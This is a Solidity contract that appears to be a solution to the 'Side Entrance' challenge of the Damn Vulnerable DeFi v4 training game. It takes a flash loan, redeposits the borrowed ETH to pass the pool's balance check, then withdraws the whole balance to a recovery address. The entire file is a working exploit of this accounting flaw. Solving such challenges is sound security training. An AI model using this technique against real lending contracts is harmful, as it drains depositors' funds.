// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntranceReceiver is IFlashLoanEtherReceiver {
    using SafeTransferLib for address payable;

    SideEntranceLenderPool public immutable pool;

    address public immutable recovery;

    receive() external payable {}

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    // Flash loan ETH from the pool
    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    // Deposit flash-loaned ETH into the pool
    // The flashLoan method checks that the balance of the pool is the same
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    // Withdraw all ETH from the pool
    function withdraw() external {
        pool.withdraw();
        payable(recovery).safeTransferAllETH();
    }
}
